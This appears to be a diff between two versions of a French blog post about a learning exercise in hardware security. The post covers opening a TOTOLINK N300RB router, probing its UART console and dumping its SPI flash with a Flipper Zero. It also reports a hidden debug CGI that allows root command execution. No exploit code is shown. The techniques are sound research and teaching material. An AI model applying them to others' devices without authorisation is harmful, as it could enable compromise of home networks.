@@ -12,8 +12,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta name="generator" content="Hugo 0.147.3">
   <meta name="robots" content="index, follow" />
-  <meta name="description" content=" TL;DR Après l’extraction et l’analyse du firmware d’un router TOTOLINK N300RB, une backdoor interface de debug /cgi-b]]in/d.cgi permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous condition d’activation d’une option dans la configuration du router ainsi qu’un mot de passe.
-Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors de l’analyse du firmware d’un routeur cible et plus précisémment :" />
+  <meta name="description" content="Après l’extraction et l’analyse du firmware d’un routeur TOTOLINK N300RB, une backdoor interface de debug (/cgi/d.cgi) permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous certaines conditions telles que l’activation d’une option spécifique de la configuration du routeur ainsi que l’utilisation d’un secret…" />
     <meta name="author" content="Skander BELABED" />
 
     <title>Toto Découvre Une &#34;Interface De Debug&#34; | 0x09</title>
@@ -40,8 +39,7 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
     content="Toto Découvre Une \"Interface De Debug\""
   />
   <meta property="og:site_name" content="0x09" />
-  <meta property="og:description" content=" TL;DR Après l’extraction et l’analyse du firmware d’un router TOTOLINK N300RB, une backdoor interface de debug /cgi-b]]in/d.cgi permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous condition d’activation d’une option dans la configuration du router ainsi qu’un mot de passe.
-Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors de l’analyse du firmware d’un routeur cible et plus précisémment :" />
+  <meta property="og:description" content="Après l’extraction et l’analyse du firmware d’un routeur TOTOLINK N300RB, une backdoor interface de debug (/cgi/d.cgi) permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous certaines conditions telles que l’activation d’une option spécifique de la configuration du routeur ainsi que l’utilisation d’un secret…" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://0x09.dev/posts/toto_decouvre_une_backdoor/" />
 
@@ -52,14 +50,13 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
     />
     <meta
       property="article:modified_time"
-      content="2025-05-16T22:40:34+02:00"
+      content="2025-05-17T15:23:05+02:00"
     />
 
 
   <meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="Toto Découvre Une \"Interface De Debug\"" />
-  <meta name="twitter:description" content=" TL;DR Après l’extraction et l’analyse du firmware d’un router TOTOLINK N300RB, une backdoor interface de debug /cgi-b]]in/d.cgi permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous condition d’activation d’une option dans la configuration du router ainsi qu’un mot de passe.
-Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors de l’analyse du firmware d’un routeur cible et plus précisémment :" />
+  <meta name="twitter:description" content="Après l’extraction et l’analyse du firmware d’un routeur TOTOLINK N300RB, une backdoor interface de debug (/cgi/d.cgi) permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous certaines conditions telles que l’activation d’une option spécifique de la configuration du routeur ainsi que l’utilisation d’un secret…" />
 
 <script type="application/ld+json">
   {
@@ -69,8 +66,8 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
       "name": "Toto Découvre Une \"Interface De Debug\"",
       "url" : "https://0x09.dev/posts/toto_decouvre_une_backdoor/",
       "headline": "Toto Découvre Une \"Interface De Debug\"",
-      "description": " TL;DR Après l’extraction et l’analyse du firmware d’un router TOTOLINK N300RB, une backdoor interface de debug \/cgi-b]]in\/d.cgi permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous condition d’activation d’une option dans la configuration du router ainsi qu’un mot de passe.\nIntroduction Objectifs Dans une optique d’apprentissage sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors de l’analyse du firmware d’un routeur cible et plus précisémment :",
-      "wordCount" : "3071",
+      "description": "Après l’extraction et l’analyse du firmware d’un routeur TOTOLINK N300RB, une backdoor interface de debug (\/cgi\/d.cgi) permettant de lire des fichiers et d’exécuter des commandes de manière arbitraire en tant qu’utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous certaines conditions telles que l’activation d’une option spécifique de la configuration du routeur ainsi que l’utilisation d’un secret…",
+      "wordCount" : "3833",
       "license": "CC BY-SA 4.0",
       "inLanguage": "en",
       "isFamilyFriendly": "true",
@@ -89,7 +86,7 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
       "copyrightYear" : "2025",
       "dateCreated": "2025-05-14T20:18:18.00Z",
       "datePublished": "2025-05-14T20:18:18.00Z",
-      "dateModified": "2025-05-16T22:40:34.00Z",
+      "dateModified": "2025-05-17T15:23:05.00Z",
       "publisher":{
           "@type":"Organization",
           "name": "0x09",
@@ -296,7 +293,9 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
       
     </header>
     <section class="gblog-markdown">
-      <div class="flex align-center gblog-post__anchorwrap">
+      <figure style="text-align: center;"><img src="/img/toto/toto-door.png" style="width: 80%; height: 100%;" /></figure>
+<hr>
+<div class="flex align-center gblog-post__anchorwrap">
     <h1 id="tldr"
     >
         TL;DR
@@ -305,7 +304,58 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Après l&rsquo;extraction et l&rsquo;analyse du firmware d&rsquo;un router <em>TOTOLINK N300RB</em>, une <del>backdoor</del> interface de debug /cgi-b]]in/d.cgi permettant de lire des fichiers et d&rsquo;exécuter des commandes de manière arbitraire en tant qu&rsquo;utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous condition d&rsquo;activation d&rsquo;une option dans la configuration du router ainsi qu&rsquo;un mot de passe.</p>
+<p>Après l&rsquo;extraction et l&rsquo;analyse du firmware d&rsquo;un routeur <em>TOTOLINK N300RB</em>, une <del>backdoor</del> interface de debug <em>(/cgi/d.cgi)</em> permettant de lire des fichiers et d&rsquo;exécuter des commandes de manière arbitraire en tant qu&rsquo;utilisateur root a été découverte. Cette fonctionnalité peut être utilisée sous certaines conditions telles que l&rsquo;activation d&rsquo;une option spécifique dans la configuration du routeur ainsi que l&rsquo;utilisation d&rsquo;un secret.</p>
+<hr>
+<p><strong>SOMMAIRE</strong>
+
+
+
+  <div class="gblog-toc gblog-toc__level--3">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#objectifs">Objectifs</a></li>
+        <li><a href="#sujet-n300rb">Sujet N300RB</a></li>
+      </ul>
+    </li>
+    <li><a href="#une-première-autopsie">Une première autopsie</a></li>
+    <li><a href="#uart">UART</a>
+      <ul>
+        <li><a href="#matériel-utilisé">Matériel utilisé</a></li>
+        <li><a href="#brancher-le-tout">Brancher le tout</a></li>
+        <li><a href="#impasse">Impasse</a></li>
+      </ul>
+    </li>
+    <li><a href="#extraction-du-firmware-via-spi">Extraction du firmware via SPI</a>
+      <ul>
+        <li><a href="#matériel-utilisé-1">Matériel utilisé</a></li>
+        <li><a href="#brancher-le-tout-1">Brancher le tout</a></li>
+        <li><a href="#une-deuxième-autopsie">Une deuxième autopsie</a></li>
+      </ul>
+    </li>
+    <li><a href="#analyse-du-firmware">Analyse du firmware</a>
+      <ul>
+        <li><a href="#run-binwalk">&ldquo;run&rdquo; Binwalk</a></li>
+        <li><a href="#mapping-du-code-source">Mapping du code source</a></li>
+        <li><a href="#un-air-de-déjà-vu">Un air de déjà vu</a></li>
+        <li><a href="#analyse-du-fichier">Analyse du fichier</a>
+          <ul>
+            <li><a href="#une-option-pas-si-optionnelle">Une option pas si optionnelle</a></li>
+            <li><a href="#un--minerai-secret-en-paramètre">Un &quot; <del>minerai</del>&quot; secret en paramètre</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#r00t">R00T</a></li>
+    <li><a href="#références">Références</a></li>
+  </ul>
+</nav>
+    <hr />
+  </div>
+
+</p>
 <div class="flex align-center gblog-post__anchorwrap">
     <h1 id="introduction"
     >
@@ -324,11 +374,11 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Dans une optique d&rsquo;apprentissage sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors de l&rsquo;analyse du firmware d&rsquo;un routeur cible et plus précisémment :</p>
+<p><strong>Dans un cadre d&rsquo;apprentissage personnel</strong> sur la sécurité hardware, nous allons retracer les différentes étapes réalisées lors d&rsquo;une l&rsquo;analyse du firmware :</p>
 <ul>
-<li>L&rsquo;identification des protocoles de communication ou de debug</li>
-<li>L&rsquo;extraction du firmware du routeur</li>
-<li>L&rsquo;analyse du firmware et la recherches de vulnérabilités</li>
+<li>Identification des protocoles de communication ou de debug</li>
+<li>Extraction du firmware du routeur</li>
+<li>Analyse du firmware et recherche de vulnérabilités</li>
 </ul>
 <div class="flex align-center gblog-post__anchorwrap">
     <h2 id="sujet-n300rb"
@@ -339,18 +389,21 @@ Introduction Objectifs Dans une optique d’apprentissage sur la sécurité hard
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>La cible choisie pour cette démarche <em>(de manière totalement hasardeuse)</em> est un router TOTOLINK modèle N300RB.
-TODO : image du carton</p>
+<p>La cible choisie pour cette démarche <em>(de manière totalement hasardeuse)</em> est un routeur <strong>TOTOLINK modèle N300RB</strong> avec un firmware <strong>version 8.54</strong>.</p>
+<figure style="text-align: center;"><img src="/img/toto/router-box-1.png" style="width: 50%; height: 100%;" /></figure>
+<figure style="text-align: center;"><img src="/img/toto/web-portal-1.png" /><figcaption style="text-align: center;">/login/login.cgi</figcaption></figure>
 <div class="flex align-center gblog-post__anchorwrap">
-    <h1 id="première-autopsie"
+    <h1 id="une-première-autopsie"
     >
-        Première autopsie
+        Une première autopsie
     </h1>
-    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#première-autopsie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Première autopsie" href="#premi%c3%a8re-autopsie">
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#une-première-autopsie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Une première autopsie" href="#une-premi%c3%a8re-autopsie">
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Après une ouverture pleine de maladresses du routeur, la première étape consiste à perdre son regard sur le PCB et d&rsquo;essayer d&rsquo;identifier un maximum de composants et de potentiels protocole de debug de manière visuelle. Après une rapide analyse, voici les éléments qui selon notre plan d&rsquo;attaque pouvaient être intéressants :</p>
+<p>Une fois le routeur ouvert, la première étape consiste à essayer d&rsquo;identifier un maximum de composants et d&rsquo;interfaces pouvants être utiles dans l&rsquo;accomplissement de nos objectifs.</p>
+<figure style="text-align: center;"><img src="/img/toto/router-components-1.png"  /></figure>
+<p>En se basant sur une analyse visuelle, on peut déjà distinguer certains éléments intéressants :</p>
 <div class=table-wrap> <table>
   <thead>
       <tr>
@@ -361,15 +414,15 @@ TODO : image du carton</p>
   <tbody>
       <tr>
           <td>UART</td>
-          <td>Interface de debug pouvant potentiellement offrir un shell ou une fonctionnalité d&rsquo;extraction de firmware</td>
+          <td>Interface de debug pouvant potentiellement offrir directement un shell ou des fonctionnalités pouvant être détournées dans le but d&rsquo;extraire le firmware</td>
       </tr>
       <tr>
           <td>JTAG</td>
           <td>X</td>
       </tr>
       <tr>
-          <td>Mémoire FLASH</td>
-          <td>Contient le firmware et nous permetterai un potentiel dump</td>
+          <td>Mémoire flash (MX25L3206E)</td>
+          <td>Mémoire NOR pouvant potentiellement contenir le firmware du routeur</td>
       </tr>
   </tbody>
 </table> </div>
@@ -382,6 +435,118 @@ TODO : image du carton</p>
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
+<p>Commençons donc par l&rsquo;interface <a
+  class="gblog-markdown__link"
+  href="https://fr.wikipedia.org/wiki/UART"
+>UART</a>. L&rsquo;objectif ici est de se connecter en <em>UART</em> sur le routeur et analyser les informations ou fonctionnalités potentiellement présentes et qui dans certains cas peuvent nous mener à une extraction du firmware.</p>
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="matériel-utilisé"
+    >
+        Matériel utilisé
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#matériel-utilisé" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Matériel utilisé" href="#mat%c3%a9riel-utilis%c3%a9">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<div class=table-wrap> <table>
+  <thead>
+      <tr>
+          <th>Matériel</th>
+          <th>Utilité</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Adaptateur USB-TTL(UART)</td>
+          <td>Nous permettera d&rsquo;établir une communication <em>serial</em> entre notre machine et le routeur</td>
+      </tr>
+      <tr>
+          <td>Multimètre</td>
+          <td>Pour permettera d&rsquo;identifier les quatres pins UART (VCC, GND, RX et TX)</td>
+      </tr>
+  </tbody>
+</table> </div>
+<figure style="text-align: center;"><img src="/img/toto/adaptateur-usb-ttl.jpeg" style="width: 50%; height: 100%;"/><figcaption style="text-align: center;"></figcaption>Adaptateur USB-TTL FT232</figure>
+<figure style="text-align: center;"><img src="/img/toto/multimetre.jpeg" style="width: 50%; height: 100%;"/><figcaption style="text-align: center;"></figcaption>Multimètre</figure>
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="brancher-le-tout"
+    >
+        Brancher le tout
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#brancher-le-tout" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Brancher le tout" href="#brancher-le-tout">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<p>Après identification de chaque pin avec le multimètre, on se retrouve avec cet ordre de branchement :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">                PC / Adaptateur USB-TTL               Routeur
+</span></span><span class="line"><span class="cl">              ┌──────────────────────────┐        ┌────────────────┐
+</span></span><span class="line"><span class="cl">              │                          │        │                │
+</span></span><span class="line"><span class="cl">              │     USB vers TTL         │        │     UART TTL   │
+</span></span><span class="line"><span class="cl">              │                          │        │      (3.3V)    │
+</span></span><span class="line"><span class="cl">              └──────────────────────────┘        └────────────────┘
+</span></span><span class="line"><span class="cl">                         │                                │
+</span></span><span class="line"><span class="cl">                         │                                │
+</span></span><span class="line"><span class="cl">                ┌────────▼────────┐              ┌────────▼─────────┐
+</span></span><span class="line"><span class="cl">                │   GND (blanc)   │──────────────&gt;   GND            │
+</span></span><span class="line"><span class="cl">                ├─────────────────┤              ├──────────────────┤
+</span></span><span class="line"><span class="cl">                │   TX  (noir)    │──────────────&gt;   RX             │
+</span></span><span class="line"><span class="cl">                ├─────────────────┤              ├──────────────────┤
+</span></span><span class="line"><span class="cl">                │   RX  (jaune)   │&lt;──────────────   TX             │
+</span></span><span class="line"><span class="cl">                ├─────────────────┤              ├──────────────────┤
+</span></span><span class="line"><span class="cl">                │   VCC           │              │  Alimentation    │
+</span></span><span class="line"><span class="cl">                │ (non connecté)  │              │    secteur       │
+</span></span><span class="line"><span class="cl">                └─────────────────┘              └──────────────────┘
+</span></span></code></pre></div><figure style="text-align: center;"><img src="/img/toto/uart-connected.jpeg" /><figcaption style="text-align: center;"></figcaption>Connexion UART</figure>
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="impasse"
+    >
+        Impasse
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#impasse" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Impasse" href="#impasse">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<p>Une fois le tout branché, on peut à présent lancer <a
+  class="gblog-markdown__link"
+  href="https://github.com/npat-efault/picocom"
+>picocom</a> en spécifiant le port <em>serial</em> correspondant à notre adaptateur <em>(dans notre cas /dev/ttyUSB0)</em> et tester dans un premier temps un des <a
+  class="gblog-markdown__link"
+  href="https://fr.wikipedia.org/wiki/Baud_%28mesure%29"
+>baud rate</a> les plus courants (-b 115200) :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ picocom -b <span class="m">115200</span> /dev/ttyUSB0 --logfile uart.log
+</span></span><span class="line"><span class="cl">Decompressing...done
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CFE version 5.100.138.3 based on BBP 1.0.37 <span class="k">for</span> BCM947XX <span class="o">(</span>32bit,SP,LE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Build Date: Mon May  <span class="m">2</span> 16:06:18 KST <span class="m">2011</span> <span class="o">(</span>bcm5357@localhost.localdomain<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 2000-2008 Broadcom Corporation.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Init Arena
+</span></span><span class="line"><span class="cl">Init Devs.
+</span></span><span class="line"><span class="cl">Boot partition <span class="nv">size</span> <span class="o">=</span> 131072<span class="o">(</span>0x20000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Found an ST compatible serial flash with <span class="m">64</span> 64KB blocks<span class="p">;</span> total size 4MB
+</span></span><span class="line"><span class="cl">et0: Broadcom BCM47XX 10/100/1000 Mbps Ethernet Controller 5.100.138.3
+</span></span><span class="line"><span class="cl">CPU <span class="nb">type</span> 0x19749: 300MHz
+</span></span><span class="line"><span class="cl">Tot mem: <span class="m">16384</span> KBytes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Device eth0:  hwaddr B8-55-10-C9-A4-E4, ipaddr 192.168.0.1, mask 255.255.255.0
+</span></span><span class="line"><span class="cl">        gateway not set, nameserver not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="o">====================================================================================</span>
+</span></span><span class="line"><span class="cl">		Product ID: zn300rb
+</span></span><span class="line"><span class="cl">		Version   : 8.54
+</span></span><span class="line"><span class="cl"><span class="o">====================================================================================</span>
+</span></span><span class="line"><span class="cl">Check Magic RTMG: <span class="o">[</span> OK <span class="o">]</span>
+</span></span><span class="line"><span class="cl">Check Product ID .. <span class="o">(</span>boot:zn300rb<span class="o">)</span>---<span class="o">(</span>run:zn300rb<span class="o">)</span> : <span class="o">[</span> OK <span class="o">]</span>
+</span></span><span class="line"><span class="cl">Check ICV .. 7a5b8b3a:7a5b8b3a : <span class="o">[</span> OK <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">====================================================================================</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="o">=================================================================</span>
+</span></span><span class="line hl"><span class="cl">press magic key to change default setting ...
+</span></span><span class="line"><span class="cl">  LAN MAC : B8:55:10:C9:A4:E4
+</span></span><span class="line"><span class="cl">  WAN MAC : B8:55:10:C9:A4:E5
+</span></span><span class="line"><span class="cl">iptables: No chain/target/match by that name
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>Malgré la présence de plusieurs informations intéressantes, l&rsquo;accès aux fonctionnalités du bootloader semble protégé par une &ldquo;magic key&rdquo; <em>(probablement la combinaison de plusieurs touches)</em>. Passons donc au plan suivant.</p>
 <div class="flex align-center gblog-post__anchorwrap">
     <h1 id="extraction-du-firmware-via-spi"
     >
@@ -394,7 +559,16 @@ TODO : image du carton</p>
 <p>La deuxième tentative d&rsquo;extraction repose sur la liaison <a
   class="gblog-markdown__link"
   href="https://fr.wikipedia.org/wiki/Serial_Peripheral_Interface#:~:text=Un%20analyseur%20de%20protocole%20SPI,%C3%A0%20certains%20mod%C3%A8les%20d%27oscilloscope."
->SPI</a>. L&rsquo;objectif est simple <em>(sur le papier)</em> : relier la mémoire flash du routeur à un programmeur et extraire les données qui y sont contenues. Le matériel était donc :</p>
+>SPI</a>. L&rsquo;objectif est simple <em>(sur le papier)</em> : relier la mémoire flash du routeur à un programmeur et extraire les données qui y sont contenues.</p>
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="matériel-utilisé-1"
+    >
+        Matériel utilisé
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#matériel-utilisé-1" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Matériel utilisé" href="#mat%c3%a9riel-utilis%c3%a9-1">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
 <div class=table-wrap> <table>
   <thead>
       <tr>
@@ -405,20 +579,113 @@ TODO : image du carton</p>
   <tbody>
       <tr>
           <td>Flipper Zero</td>
-          <td>Jouera le rôle du programmeur sachant qu&rsquo;il supporte les liaisons SPI grâce à ces pins GPIO</td>
+          <td>Jouera le rôle du programmeur sachant qu&rsquo;il supporte les liaisons SPI en utilisant ses pins GPIO</td>
       </tr>
       <tr>
           <td>Câble dupont</td>
-          <td>Pour assurer la liaison vers les GPIO</td>
+          <td>Pour connecter le tout</td>
       </tr>
       <tr>
           <td>Une pince SOIC-8/SOP-8</td>
-          <td>C&rsquo;est un outil qui va nous permettre d&rsquo;assurer un contact avec la mémoire flash sans dévoir déssouder le composant</td>
+          <td>Un outil qui va nous permettre d&rsquo;assurer un contact de manière simple avec la mémoire flash <em>(sans dévoir déssouder le composant <strong>*spoiler : on va devoir le faire</strong> *)</em></td>
       </tr>
   </tbody>
 </table> </div>
-<p>La matériel en main, il faudra donc déterminer comment brancher tout cela ensemble. Un point de départ est la documentation de la mémoire flash qui dans la majorité des cas identifie chaque pin SPI :</p>
-<figure align="center"><img src="/img/toto/spi-vendor.png" /><figcaption align="center">Attaque NTLM Relay</figcaption></figure>
+<figure style="text-align: center;"><img src="/img/toto/pince-sop8.jpeg" style="width: 50%; height: 100%;"/><figcaption style="text-align: center;"></figcaption>Pince SOIC-8/SOP-8</figure>
+<p>La matériel en main, il faudra donc déterminer comment brancher tout cela ensemble. Un point de départ est la <a
+  class="gblog-markdown__link"
+  href="https://docs.rs-online.com/5c85/0900766b814ac6f9.pdf"
+>documentation</a> de la mémoire flash qui dans la majorité des cas identifie chaque pin SPI :</p>
+<figure style="text-align: center;"><img src="/img/toto/spi-vendor.png" /><figcaption style="text-align: center;"><a href="https://docs.rs-online.com/5c85/0900766b814ac6f9.pdf">https://docs.rs-online.com/5c85/0900766b814ac6f9.pdf</a></figcaption></figure>
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="brancher-le-tout-1"
+    >
+        Brancher le tout
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#brancher-le-tout-1" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Brancher le tout" href="#brancher-le-tout-1">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<p>Comme mentionné précédement, on va utiliser un Flipper Zero durant ce processus et l&rsquo;application utilisée est <a
+  class="gblog-markdown__link"
+  href="https://lab.flipper.net/apps/spi_mem_manager"
+>SPI Mem Manager</a>. Il faudra donc faire le parallèle entre les pins de la mémoire flash et les différents pins du Flipper Zero.</p>
+<figure style="text-align: center;"><img src="/img/toto/flipperzero-spi-pins-wiring.png" /><figcaption style="text-align: center;"><a href="https://lab.flipper.net/apps/spi_mem_manager">https://lab.flipper.net/apps/spi_mem_manager</a></figcaption></figure>
+<p>En se basant sur la documentation de <em>SPI Mem Manager</em>, on obtient donc :</p>
+<div class=table-wrap> <table>
+  <thead>
+      <tr>
+          <th>PIN FLIPPER ZERO</th>
+          <th>MX25L3206E</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>2</td>
+          <td>MOSI</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>MOSO</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>CS</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>CLK</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>GND</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>3.3V</td>
+      </tr>
+  </tbody>
+</table> </div>
+<figure style="text-align: center;"><img src="/img/toto/pince-flipperzero.jpeg" /><figcaption style="text-align: center;"></figcaption>Branchement de la pince avec le Flipper Zero</figure>
+
+
+
+<blockquote class="gblog-hint note">
+  <div class="gblog-hint__title flex align-center"><i class="fa note" title="Note"></i></div>
+  <div class="gblog-hint__text">Il est généralement possible d&rsquo;identifier le pin n°1 (CS#) sur le composant grâce à la présence d&rsquo;une marque et plus précisément un point à côté de ce dernier.</div>
+</blockquote>
+
+<div class="flex align-center gblog-post__anchorwrap">
+    <h2 id="une-deuxième-autopsie"
+    >
+        Une deuxième autopsie
+    </h2>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#une-deuxième-autopsie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Une deuxième autopsie" href="#une-deuxi%c3%a8me-autopsie">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<p>Il ne nous restera plus qu&rsquo;à connecter la pince au composant et lancer la lecture depuis le Flipper Zero.</p>
+<figure style="text-align: center;"><img src="/img/toto/spi-read-1.png" /><figcaption style="text-align: center;"></figcaption>Lecture de la mémoire flash</figure>
+<figure style="text-align: center;"><img src="/img/toto/spi-read-2.png" /><figcaption style="text-align: center;"></figcaption>Taille du contenu extrait</figure>
+
+
+
+<blockquote class="gblog-hint note">
+  <div class="gblog-hint__title flex align-center"><i class="fa note" title="Note"></i></div>
+  <div class="gblog-hint__text">Pour réaliser cette connexion SPI, il est important que l&rsquo;appareil cible ne soit pas alimenté <em>(la mémoire flash sera alimentée elle seule grâce au pin VCC 3.3v)</em>. Dans le cas contraire, la mémoire flash sera naturellement sollicitée par le cpu et notre programmeur ne sera pas en mesure de communiquer avec elle.</div>
+</blockquote>
+
+
+
+
+<blockquote class="gblog-hint note">
+  <div class="gblog-hint__title flex align-center"><i class="fa note" title="Note"></i></div>
+  <div class="gblog-hint__text">Durant les tests, l&rsquo;opération ne s&rsquo;est pas totalement déroulée comme prévue. En effet, un phénomène qui au final n&rsquo;est pas si rare s&rsquo;est produit&hellip; un <a
+  class="gblog-markdown__link"
+  href="https://en.wikipedia.org/wiki/Backfeeding"
+>backfeeding ou backpowering</a>. En résumé, le fait de brancher la pince à la mémoire flash a provoqué l&rsquo;alimentation de tout l&rsquo;appareil, rendant ainsi la communication impossible <em>(comme expliqué sur la précédente note)</em>. Une des solutions pour contourner ce problème a été de déssouder la mémoire flash, lire son contenu puis ressouder le composant.</div>
+</blockquote>
+
 <div class="flex align-center gblog-post__anchorwrap">
     <h1 id="analyse-du-firmware"
     >
@@ -429,15 +696,15 @@ TODO : image du carton</p>
     </a>
 </div>
 <div class="flex align-center gblog-post__anchorwrap">
-    <h2 id="binwalk-run"
+    <h2 id="run-binwalk"
     >
-        Binwalk &ldquo;run&rdquo;
+        &ldquo;run&rdquo; Binwalk
     </h2>
-    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#binwalk-run" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Binwalk &ldquo;run&rdquo;" href="#binwalk-run">
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#run-binwalk" class="gblog-post__anchor clip flex align-center" aria-label="Anchor &ldquo;run&rdquo; Binwalk" href="#run-binwalk">
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>Une fois le firmware obtenu, on peut commencer son analyse avec l&rsquo;outil <a
+<p>Une fois le firmware obtenu, on peut commencer son analyse. Un bon début serait avec l&rsquo;outil <a
   class="gblog-markdown__link"
   href="https://github.com/ReFirmLabs/binwalk"
 >binwalk</a>.</p>
@@ -473,7 +740,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
   href="https://openwrt.org/docs/techref/headers"
 >TRX</a> censé contenir différentes partitions telles que celle du noyau ou encore du système de fichiers</li>
 </ol>
-<p>Pour des raisons qu&rsquo;on verra plus tard, concentrons nous donc sur ce deuxième bloc <em>TRX</em> qui suit la structure suivante :</p>
+<p>Pour des raisons qu&rsquo;on verra par la suite, on va se concentrer sur ce deuxième bloc <em>TRX</em> qui suit la structure suivante :</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">  0                   1                   2                   3
 </span></span><span class="line"><span class="cl">  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 </span></span><span class="line"><span class="cl"> +---------------------------------------------------------------+
